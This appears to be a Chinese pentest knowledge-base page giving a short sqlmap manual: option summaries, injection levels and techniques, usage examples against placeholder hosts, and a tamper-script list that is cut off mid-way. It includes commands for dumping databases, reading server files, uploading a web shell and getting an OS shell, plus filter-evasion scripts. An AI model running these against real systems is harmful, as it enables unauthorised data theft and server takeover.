<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>SQLmap简要手册 | 矛·盾 知识库</title>
    <meta name="description" content="本文提供 sqlmap 工具的简要手册，包括其功能、选项摘要、用例以及如何通过该工具进行 SQL 注入检测和数据获取">
    <meta name="generator" content="VitePress v1.6.3">
    <link rel="preload stylesheet" href="/assets/style.DjjMfG_T.css" as="style">
    <link rel="preload stylesheet" href="/vp-icons.css" as="style">
    
    <script type="module" src="/assets/app.C4I6KaR3.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/assets/chunks/theme.BiY6TBf-.js">
    <link rel="modulepreload" href="/assets/chunks/framework.97i6h3Kv.js">
    <link rel="modulepreload" href="/assets/chunks/articleMetadata.BZXad0n-.js">
    <link rel="modulepreload" href="/assets/pentest-tools_top_sqlmap.md.wlrUqO2B.lean.js">
    <meta name="theme-color" content="#3eaf7c">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="msapplication-TileColor" content="#000000">
    <meta name="msapplication-TileImage" content="/favicon.ico">
    <meta name="baidu-site-verification" content="codeva-a9OBeZwEU6">
    <link rel="apple-touch-icon" href="/favicon.ico">
    <link rel="mask-icon" href="/favicon.ico" color="#3eaf7c">
    <script src="https://hm.baidu.com/hm.js?28d2c15f874fe87dc4038ad4d40b8a29"></script>
    <script src="https://www.googletagmanager.com/gtag/js?id=G-H11BRGSRLP"></script>
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"dark",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-a559dc28><!--[--><!--]--><!--[--><span tabindex="-1" data-v-01fb9259></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-01fb9259>Skip to content</a><!--]--><!----><header class="VPNav" data-v-a559dc28 data-v-7090c2cf><div class="VPNavBar" data-v-7090c2cf data-v-0196c409><div class="wrapper" data-v-0196c409><div class="container" data-v-0196c409><div class="title" data-v-0196c409><div class="VPNavBarTitle has-sidebar" data-v-0196c409 data-v-7ffafb91><a class="title" href="/" data-v-7ffafb91><!--[--><!--]--><!--[--><!--[--><!--[--><img class="VPImage dark logo" src="/logo.png" alt data-v-38632ab8><!--]--><!--[--><img class="VPImage light logo" src="/logo.png" alt data-v-38632ab8><!--]--><!--]--><!--]--><span data-v-7ffafb91>矛·盾 知识库</span><!--[--><!--]--></a></div></div><div class="content" data-v-0196c409><div class="content-body" data-v-0196c409><!--[--><!--]--><div class="VPNavBarSearch search" data-v-0196c409><!--[--><!----><div id="local-search"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><span class="vp-icon DocSearch-Search-Icon"></span><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><!--]--></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-0196c409 data-v-93c92d2b><span id="main-nav-aria-label" class="visually-hidden" data-v-93c92d2b> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/download/" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>矛盾武器库</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/appstore/" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>应用商店</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/nav" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>安全导航</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/ai" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>AI工具箱</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/feeds-sub" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>近期资讯</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/blog" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>博客笔记</span><!--]--></a><!--]--><!--[--><div class="VPFlyout VPNavBarMenuGroup" data-v-93c92d2b data-v-40196182><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-40196182><span class="text" data-v-40196182><!----><span data-v-40196182>软件推荐</span><span class="vpi-chevron-down text-icon" data-v-40196182></span></span></button><div class="menu" data-v-40196182><div class="VPMenu" data-v-40196182 data-v-29abe1bb><div class="items" data-v-29abe1bb><!--[--><!--[--><div class="VPMenuGroup" data-v-29abe1bb data-v-813416c4><p class="title" data-v-813416c4>AI工具</p><!--[--><!--[--><div class="VPMenuLink" data-v-813416c4 data-v-c0672ce7><a class="VPLink link" href="/software/cherrystudio/introduce" data-v-c0672ce7><!--[--><span data-v-c0672ce7>Cherry-Studio</span><!--]--></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-813416c4 data-v-c0672ce7><a class="VPLink link" href="/software/lobechat/install" data-v-c0672ce7><!--[--><span data-v-c0672ce7>Lobe-Chat</span><!--]--></a></div><!--]--><!--]--></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--[--><div class="VPFlyout VPNavBarMenuGroup active" data-v-93c92d2b data-v-40196182><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-40196182><span class="text" data-v-40196182><!----><span data-v-40196182>工具手册</span><span class="vpi-chevron-down text-icon" data-v-40196182></span></span></button><div class="menu" data-v-40196182><div class="VPMenu" data-v-40196182 data-v-29abe1bb><div class="items" data-v-29abe1bb><!--[--><!--[--><div class="VPMenuGroup" data-v-29abe1bb data-v-813416c4><p class="title" data-v-813416c4>常用工具</p><!--[--><!--[--><div class="VPMenuLink" data-v-813416c4 data-v-c0672ce7><a class="VPLink link active" href="/pentest-tools/top/sqlmap" data-v-c0672ce7><!--[--><span data-v-c0672ce7>SQLmap</span><!--]--></a></div><!--]--><!--]--></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/about" tabindex="0" data-v-93c92d2b data-v-250d8668><!--[--><span data-v-250d8668>关于我</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-0196c409 data-v-d41de6fa><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="true" data-v-d41de6fa data-v-8e4696c7 data-v-1f6ede43><span class="check" data-v-1f6ede43><span class="icon" data-v-1f6ede43><!--[--><span class="vpi-sun sun" data-v-8e4696c7></span><span class="vpi-moon moon" data-v-8e4696c7></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-0196c409 data-v-1d2690c8 data-v-67fce02f><!--[--><a class="VPSocialLink no-icon" href="https://github.com/arch3rPro/arch3rpro.github.io" aria-label="github" target="_blank" rel="noopener" data-v-67fce02f data-v-b7107ea5><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-0196c409 data-v-49f4230e data-v-40196182><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-40196182><span class="vpi-more-horizontal icon" data-v-40196182></span></button><div class="menu" data-v-40196182><div class="VPMenu" data-v-40196182 data-v-29abe1bb><!----><!--[--><!--[--><!----><div class="group" data-v-49f4230e><div class="item appearance" data-v-49f4230e><p class="label" data-v-49f4230e>Appearance</p><div class="appearance-action" data-v-49f4230e><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="true" data-v-49f4230e data-v-8e4696c7 data-v-1f6ede43><span class="check" data-v-1f6ede43><span class="icon" data-v-1f6ede43><!--[--><span class="vpi-sun sun" data-v-8e4696c7></span><span class="vpi-moon moon" data-v-8e4696c7></span><!--]--></span></span></button></div></div></div><div class="group" data-v-49f4230e><div class="item social-links" data-v-49f4230e><div class="VPSocialLinks social-links-list" data-v-49f4230e data-v-67fce02f><!--[--><a class="VPSocialLink no-icon" href="https://github.com/arch3rPro/arch3rpro.github.io" aria-label="github" target="_blank" rel="noopener" data-v-67fce02f data-v-b7107ea5><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-0196c409 data-v-8e9eca5e><span class="container" data-v-8e9eca5e><span class="top" data-v-8e9eca5e></span><span class="middle" data-v-8e9eca5e></span><span class="bottom" data-v-8e9eca5e></span></span></button></div></div></div></div><div class="divider" data-v-0196c409><div class="divider-line" data-v-0196c409></div></div></div><!----></header><div class="VPLocalNav has-sidebar empty" data-v-a559dc28 data-v-618e74de><div class="container" data-v-618e74de><button class="menu" aria-expanded="false" aria-controls="VPSidebarNav" data-v-618e74de><span class="vpi-align-left menu-icon" data-v-618e74de></span><span class="menu-text" data-v-618e74de>Menu</span></button><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-618e74de data-v-3c70595d><button data-v-3c70595d>Return to top</button><!----></div></div></div><aside class="VPSidebar" data-v-a559dc28 data-v-0abb0838><div class="curtain" data-v-0abb0838></div><nav class="nav" id="VPSidebarNav" aria-labelledby="sidebar-aria-label" tabindex="-1" data-v-0abb0838><span class="visually-hidden" id="sidebar-aria-label" data-v-0abb0838> Sidebar Navigation </span><!--[--><!--]--><!--[--><div class="no-transition group" data-v-9e2dfd88><section class="VPSidebarItem level-0 collapsible has-active" data-v-9e2dfd88 data-v-f22ff244><div class="item" role="button" tabindex="0" data-v-f22ff244><div class="indicator" data-v-f22ff244></div><h2 class="text" data-v-f22ff244>常用工具 (1篇)</h2><div class="caret" role="button" aria-label="toggle section" tabindex="0" data-v-f22ff244><span class="vpi-chevron-right caret-icon" data-v-f22ff244></span></div></div><div class="items" data-v-f22ff244><!--[--><div class="VPSidebarItem level-1 is-link" data-v-f22ff244 data-v-f22ff244><div class="item" data-v-f22ff244><div class="indicator" data-v-f22ff244></div><a class="VPLink link link" href="/pentest-tools/top/sqlmap" data-v-f22ff244><!--[--><p class="text" data-v-f22ff244>SQLmap简要手册</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><!--]--><!--[--><!--]--></nav></aside><div class="VPContent has-sidebar" id="VPContent" data-v-a559dc28 data-v-12f9955e><div class="VPDoc has-sidebar has-aside" data-v-12f9955e data-v-3c2d2c68><!--[--><!--]--><div class="container" data-v-3c2d2c68><div class="aside" data-v-3c2d2c68><div class="aside-curtain" data-v-3c2d2c68></div><div class="aside-container" data-v-3c2d2c68><div class="aside-content" data-v-3c2d2c68><div class="VPDocAside" data-v-3c2d2c68 data-v-2afe6e8e><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-2afe6e8e data-v-485f653e><div class="content" data-v-485f653e><div class="outline-marker" data-v-485f653e></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-485f653e>页面导航</div><ul class="VPDocOutlineItem root" data-v-485f653e data-v-718cdb9f><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-2afe6e8e></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-3c2d2c68><div class="content-container" data-v-3c2d2c68><!--[--><!--]--><main class="main" data-v-3c2d2c68><div style="position:relative;" class="vp-doc _pentest-tools_top_sqlmap" data-v-3c2d2c68><div><h1 id="sqlmap简介" tabindex="-1">SQLmap简介 <a class="header-anchor" href="#sqlmap简介" aria-label="Permalink to &quot;SQLmap简介&quot;">​</a></h1><!----><!----><p><strong>当给sqlmap一个URL，它会干些什么？</strong></p><blockquote><p>1）判断可注入的参数</p><p>2）判断可以用那种SQL注入技术来注入</p><p>3）识别出哪种数据库</p><p>4）根据用户选择，读取哪些数据</p></blockquote><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--purge        #清除历史缓存</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h2 id="选项摘要" tabindex="-1">选项摘要 <a class="header-anchor" href="#选项摘要" aria-label="Permalink to &quot;选项摘要&quot;">​</a></h2><h4 id="输出信息的详细程度" tabindex="-1">输出信息的详细程度 <a class="header-anchor" href="#输出信息的详细程度" aria-label="Permalink to &quot;输出信息的详细程度&quot;">​</a></h4><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-v    #共7个级别(0~6)，默认为1</span></span>
<span class="line"><span>#可以用 -vv 代替 -v 2，推荐使用这种方法</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li><strong>0</strong> ：只输出 Python 出错回溯信息，错误和关键信息</li><li><strong>1</strong> ：增加输出普通信息和警告信息</li><li><strong>2</strong> ：增加输出调试信息</li><li><strong>3</strong> ：增加输出已注入的 payloads</li><li><strong>4</strong> ：增加输出 HTTP 请求</li><li><strong>5</strong> ：增加输出 HTTP 响应头</li><li><strong>6</strong> ：增加输出 HTTP 响应内容</li></ul><h4 id="目标" tabindex="-1">目标 <a class="header-anchor" href="#目标" aria-label="Permalink to &quot;目标&quot;">​</a></h4><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-d    #直连数据库，&quot;mysql://root:root@192.168.0.8:3306/testdb&quot;</span></span>
<span class="line"><span>-u URL</span></span>
<span class="line"><span>-l    #从Burp代理日志文件中解析目标地址</span></span>
<span class="line"><span>-m    #从文本文件中批量获取目标</span></span>
<span class="line"><span>-r    #从文件中读取 HTTP 请求</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--purge            #清除历史缓存</span></span>
<span class="line"><span>--flush-session    #清除上次扫描的缓存</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="请求" tabindex="-1">请求 <a class="header-anchor" href="#请求" aria-label="Permalink to &quot;请求&quot;">​</a></h4><p>指定连接目标地址的方式</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--method=METHOD        #强制使用提供的 HTTP 方法（例如：PUT）</span></span>
<span class="line"><span>--data=DATA            #使用 POST 发送数据串；--data=&quot;id=1&amp;user=admin&quot;</span></span>
<span class="line"><span>--param-del=&quot;;&quot;        #使用参数分隔符，--data=&quot;id=1;user=admin&quot;</span></span>
<span class="line"><span>--cookie=COOKIE        #指定 HTTP Cookie ，--cookie &quot;id=11&quot; --level 2</span></span>
<span class="line"><span>--drop-set-cookie    #忽略 HTTP 响应中的 Set-Cookie 参数</span></span>
<span class="line"><span>--user-agent=AGENT    #指定 HTTP User-Agent</span></span>
<span class="line"><span>--random-agent        #使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span></span>
<span class="line"><span>--referer=REFERER    #指定 HTTP Referer</span></span>
<span class="line"><span>-H HEADER            #设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span></span>
<span class="line"><span>--headers=HEADERS    #设置额外的 HTTP 头参数,必须以换行符分隔（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span></span>
<span class="line"><span>--delay=10            #设置每个 HTTP 请求的延迟秒数</span></span>
<span class="line"><span>--safe-freq=SAFE    #每访问两次给定的合法 URL 才发送一次测试请求</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h4 id="注入" tabindex="-1">注入 <a class="header-anchor" href="#注入" aria-label="Permalink to &quot;注入&quot;">​</a></h4><p>以下选项用于指定要测试的参数</p><p>提供自定义注入 payloads 和篡改参数的脚本</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-p TESTPARAMETER    #指定需要测试的参数</span></span>
<span class="line"><span>--skip=SKIP            #指定要跳过的参数</span></span>
<span class="line"><span>--dbms=DBMS            #指定 DBMS 类型（例如：MySQL）</span></span>
<span class="line"><span>--os=OS                #指定 DBMS 服务器的操作系统类型</span></span>
<span class="line"><span>--prefix=PREFIX        #注入 payload 的前缀字符串</span></span>
<span class="line"><span>--suffix=SUFFIX        #注入 payload 的后缀字符串</span></span>
<span class="line"><span>--tamper=TAMPER        #用给定脚本修改注入数据</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h4 id="检测" tabindex="-1">检测 <a class="header-anchor" href="#检测" aria-label="Permalink to &quot;检测&quot;">​</a></h4><p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p><p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p><p>你可以选择自己修改指定的 payload 用于检测。</p><p><strong>level有5级，越高检测越全，默认为 1</strong></p><blockquote><p>--level 1 检测Get和Post</p><p>--level 2 检测HTTP Cookie</p><p>--level 3 检测User-Agent和Referer</p><p>--level 4 检测</p><p>--level 5 检测 HOST 头</p></blockquote><p><strong>risk有3级，级别越高风险越大，默认为1</strong></p><blockquote><p>--risk 2 会在默认的检测上添加大量时间型盲注语句测试</p><p>--risk 3 会在原基础上添加 <code>OR</code> 类型的布尔型盲注 ，可能会update导致修改数据库</p></blockquote><h4 id="技术" tabindex="-1">技术 <a class="header-anchor" href="#技术" aria-label="Permalink to &quot;技术&quot;">​</a></h4><p>以下选项用于调整特定 SQL 注入技术的测试方法</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--technique=TECH    #使用的 SQL 注入技术（默认为“BEUSTQ”)</span></span>
<span class="line"><span>E: Error-based SQL injection（报错型注入）</span></span>
<span class="line"><span>U: UNION query SQL injection（联合查询注入）</span></span>
<span class="line"><span>S: Stacked queries SQL injection（堆查询注入）</span></span>
<span class="line"><span>T: Time-based blind SQL injection（时间型盲注）</span></span>
<span class="line"><span>Q: inline Query injection（内联查询注入）</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--time-sec=TIMESEC  #设置延时注入的时间（默认为 5）</span></span>
<span class="line"><span>--second-order=S..  #设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="枚举" tabindex="-1">枚举 <a class="header-anchor" href="#枚举" aria-label="Permalink to &quot;枚举&quot;">​</a></h4><p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-a, --all          #获取所有信息、数据</span></span>
<span class="line"><span>-b, --banner        #获取 DBMS banner,返回数据库的版本号</span></span>
<span class="line"><span>--current-user            #获取 DBMS 当前用户</span></span>
<span class="line"><span>--current-db            #获取 DBMS 当前数据库</span></span>
<span class="line"><span>--hostname                #获取 DBMS 服务器的主机名</span></span>
<span class="line"><span>--is-dba                #探测 DBMS 当前用户是否为 DBA（数据库管理员）</span></span>
<span class="line"><span>--users                    #枚举出 DBMS 所有用户</span></span>
<span class="line"><span>--passwords                #枚举出 DBMS 所有用户的密码哈希</span></span>
<span class="line"><span>--privileges            #枚举出 DBMS 所有用户特权级</span></span>
<span class="line"><span>--roles                    #枚举出 DBMS 所有用户角色</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--dbs                    #枚举出 DBMS 所有数据库</span></span>
<span class="line"><span>--tables                #枚举出 DBMS 数据库中的所有表</span></span>
<span class="line"><span>--columns                #枚举出 DBMS 表中的所有列</span></span>
<span class="line"><span>--schema                #枚举出 DBMS 所有模式</span></span>
<span class="line"><span>--count                    #获取数据表数目</span></span>
<span class="line"><span>--dump                    #导出 DBMS 数据库表项</span></span>
<span class="line"><span>--stop 10                #只取前10行数据</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>-D DB                    #指定要枚举的 DBMS 数据库</span></span>
<span class="line"><span>-T TBL                    #指定要枚举的 DBMS 数据表</span></span>
<span class="line"><span>-C COL                    #指定要枚举的 DBMS 数据列</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>--sql-query=QUERY        #指定要执行的 SQL 语句</span></span>
<span class="line"><span>--sql-shell                #调出交互式 SQL shell</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h2 id="用例" tabindex="-1">用例 <a class="header-anchor" href="#用例" aria-label="Permalink to &quot;用例&quot;">​</a></h2><p><strong>从文件读取HTTP请求，GET和POST都可以</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -r &quot;burp.txt&quot; -p &quot;username&quot;    #-p 指定存在注入的参数</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><strong>Cookie注入</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;http://www.vuln.com&quot; --cookie &quot;id=11&quot; --level 2</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><strong>当防火墙，对请求速度做了限制</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;http://www.vuln.com/post.php?id=1&quot; --delay=10</span></span>
<span class="line"><span>#在每个HTTP请求之间的延迟10秒</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="伪静态注入" tabindex="-1">伪静态注入 <a class="header-anchor" href="#伪静态注入" aria-label="Permalink to &quot;伪静态注入&quot;">​</a></h2><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个&#39;*&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h2 id="访问文件系统" tabindex="-1">访问文件系统 <a class="header-anchor" href="#访问文件系统" aria-label="Permalink to &quot;访问文件系统&quot;">​</a></h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有读写权限，有目录读写文件权限</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u url --is-dba</span></span>
<span class="line"><span>#查看是否dba权限,必须为root权限</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sqlmap -u url --file-read &quot;C:/Windows/win.ini&quot;        </span></span>
<span class="line"><span>#读取文件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php</span></span>
<span class="line"><span>#上传文件 (本地木马路径:目标网站目录)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="接管操作系统" tabindex="-1">接管操作系统 <a class="header-anchor" href="#接管操作系统" aria-label="Permalink to &quot;接管操作系统&quot;">​</a></h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有读写权限，有目录读写文件权限</p><p>sqlmap 能够在 <strong>数据库所在服务器的操作系统上运行任意的命令</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;URL&quot; --os-shell    #获取系统交互shell或--os-cmd=id执行系统命令</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><a href="https://blog.sari3l.com/posts/8dea0d95/" target="_blank" rel="noreferrer">原理</a> 就是上传一个upload木马后，再上传一个cmd shell；</p><p>当 --os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。</p><blockquote><p>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数</p><p>分别为 <code>sys_exec()</code> 和 <code>sys_eval()</code> 的共享库（二进制文件）</p><p>然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p><p>在 Microsoft SQL Server 中，sqlmap 会利用 <code>xp_cmdshell</code> 存储过程：</p><p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；</p><p>如果该存储过程不存在，sqlmap 则会重新创建它。</p><p>当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。</p><p>相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p><p>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，</p><p>假如后端 DBMS 和 Web 服务器在同一台服务器上，</p><p>则仍可以通过利用 <code>SELECT</code> 语句中的 <code>INTO OUTFILE</code> ，在 根目录可写目录中写shell</p></blockquote><h2 id="udf提权" tabindex="-1">UDF提权 <a class="header-anchor" href="#udf提权" aria-label="Permalink to &quot;UDF提权&quot;">​</a></h2><p>使用选项 <code>--udf-inject</code> 并按照说明进行操作即可；</p><p>如果需要，也可以使用 <code>--shared-lib</code> 选项通过命令行指定共享库的本地文件系统路径。</p><p>否则 sqlmap 会在运行时向你询问路径。</p><p>此功能仅对 MySQL 或 PostgreSQL 有用。</p><h2 id="tamper脚本" tabindex="-1">tamper脚本 <a class="header-anchor" href="#tamper脚本" aria-label="Permalink to &quot;tamper脚本&quot;">​</a></h2><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>use age：sqlmap.py --tamper=&quot;模块名.py&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>apostrophemask            #将单引号 url 编码</span></span>
<span class="line"><span>apostrophenullencode    #将单引号替换为宽字节 unicode 字符</span></span>
<span class="line"><span>base64encode            #base64 编码</span></span>
<span class="line"><span>between            #将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</span></span>
